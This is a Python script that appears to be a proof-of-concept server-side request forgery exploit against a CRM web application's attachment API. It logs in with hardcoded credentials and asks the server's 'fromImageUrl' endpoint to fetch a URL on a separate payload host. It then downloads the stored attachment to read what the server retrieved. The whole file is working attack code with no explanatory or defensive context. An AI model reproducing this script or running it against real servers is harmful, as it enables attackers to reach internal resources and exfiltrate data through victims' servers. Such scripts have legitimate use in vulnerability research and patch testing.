import requests
import json
from requests.auth import HTTPBasicAuth

SERVER_URL = 'http://localhost:18080'
USER = 'user'
PASSWORD = '123456'
PAYLOAD_URL = "http://192.168.144.1:8887" #"http://127.0.0.1:8888"

if __name__ == '__main__':
    session = requests.Session()
    auth = HTTPBasicAuth(USER, PASSWORD)
    login_page_url = f"{SERVER_URL}/api/v1/App/user"
    login_page_response = session.get(login_page_url, auth=auth)
    print(login_page_response.text)

    attachment_url = f"{SERVER_URL}/api/v1/Attachment/fromImageUrl"
    attachment_data = {
        "url": PAYLOAD_URL,
        "parentType": "Note",
        "field": "attachments"
    }
    attachment_response = session.post(attachment_url, json=attachment_data, auth=auth)
    if not attachment_response.text:
        print("No attachment response")
        exit(1)
    attachment_response_json = json.loads(attachment_response.text)
    attachment_id = attachment_response_json['id']
    print(f"Attachment id: {attachment_id}")

    download_url = f"{SERVER_URL}/api/v1/Attachment/file/{attachment_id}"
    download_response = session.get(download_url, auth=auth)
    print(f"Download response: {download_response.text}")



